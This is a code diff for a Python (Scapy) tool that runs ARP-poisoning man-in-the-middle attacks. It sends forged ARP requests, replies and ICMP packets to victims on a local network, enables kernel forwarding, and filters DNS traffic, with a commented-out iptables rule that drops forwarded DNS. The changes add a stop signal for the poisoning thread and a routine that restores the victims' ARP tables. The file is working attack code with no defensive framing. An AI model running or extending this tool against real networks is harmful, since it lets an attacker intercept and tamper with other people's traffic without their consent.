@@ -30,23 +30,32 @@ def forge_arp_request(src_ip, src_mac, dst_ip, dst_mac):
     	hwdst="00:00:00:00:00:00"
 	)
 	
-def poison_loop(forged_icmp_echo_requests, forged_replies, forged_requests, interface, iterations):
+def poison_loop(forged_icmp_echo_requests, forged_replies, forged_requests, interface, iterations, stop_event):
 	i = 1
 	# Repeatedly sends each forged response at once and then sleeps for [interval] seconds
-	while iterations == 0 or i <= iterations:
+	while (iterations == 0 and not stop_event.is_set()) or i <= iterations:
 		# Send packets based on the config settings
+		print("Sending poison packets...")
 		if (config.arp_poison_icmp):
-			sendp(forged_icmp_echo_requests, iface=interface)
+			sendp(forged_icmp_echo_requests, iface=interface, verbose=False)
 		if (config.arp_poison_reply):
-			sendp(forged_replies, iface=interface)
+			sendp(forged_replies, iface=interface, verbose=False)
 		if (config.arp_poison_request):
-			sendp(forged_requests, iface=interface)
+			sendp(forged_requests, iface=interface, verbose=False)
 
 		# For the first 5 poison batches use the warm up delay
 		if i < 5:
-			time.sleep(config.arp_poison_warm_up)
+			# Check if thread should stop every 1 second
+			for j in range(config.arp_poison_warm_up):
+				time.sleep(1)
+				if stop_event.is_set():
+					return
 		else:
-			time.sleep(config.arp_poison_delay)
+			# Check if thread should stop every 1 second
+			for j in range(config.arp_poison_delay):
+				time.sleep(1)
+				if stop_event.is_set():
+					return
 		i += 1
 	
 def start_arp_mitm(victims, self_mac, interface):
@@ -73,17 +82,23 @@ def start_arp_mitm(victims, self_mac, interface):
 		if (ip1, mac1) != (ip2, mac2)
 	]
 
-	thread = threading.Thread(target=poison_loop, args=(forged_icmp_echo_requests, forged_replies, forged_requests, interface, 0), daemon=True)
+	# event to signal that the poison_loop thread should stop
+	stop_event = threading.Event()
+
+	thread = threading.Thread(target=poison_loop, args=(forged_icmp_echo_requests, forged_replies, forged_requests, interface, 0, stop_event), daemon=True)
 
 	thread.start()
 
-	return thread
+	return thread, stop_event
 
 	# todo find good timings for sending poison/stealth mode(?) (base on OS?)
 
     
-def stop_arp_mitm(thread, interface):
-	thread._delete()
+def stop_arp_mitm(thread, stop_event, interface):
+	print("Stopping ARP poisoning thread...")
+	# signal the poison thread to stop
+	stop_event.set()
+	thread.join()
 
 	# create forged packets to restore the arp tables of the victims to the valid values
 	forged_replies = [
@@ -100,8 +115,11 @@ def stop_arp_mitm(thread, interface):
 		if (ip1, mac1) != (ip2, mac2)
 	]
 
+	print("Re-poisoning the victims to restore the valid ARP entries...")
+	# create a new stop_event for the repoisoning
+	stop_event = threading.Event()
 	# run the poison loop 3 times to restore the valid entries
-	poison_loop(None, forged_replies, forged_requests, interface, 3)
+	poison_loop(None, forged_replies, forged_requests, interface, 3, stop_event)
 	
 def only_dns(pkt):
 	return pkt.haslayer(DNS)
@@ -114,7 +132,7 @@ def print_fn(pkt, ips, interface):
 def start_attack(victims, self_ip, self_mac, interface):
 	enable_kernel_forwarding(interface)
 
-	thread = start_arp_mitm(victims, self_mac, interface)
+	thread, stop_event = start_arp_mitm(victims, self_mac, interface)
 		
 	# Temp: make this function later	
 	# run("iptables -I FORWARD -p udp --dport 53 -j DROP")
@@ -124,7 +142,7 @@ def start_attack(victims, self_ip, self_mac, interface):
 
 	input("\nstop")
 
-	stop_arp_mitm(thread, interface)
+	stop_arp_mitm(thread, stop_event, interface)
 	cleanup_forward(interface)
 
 # placeholder
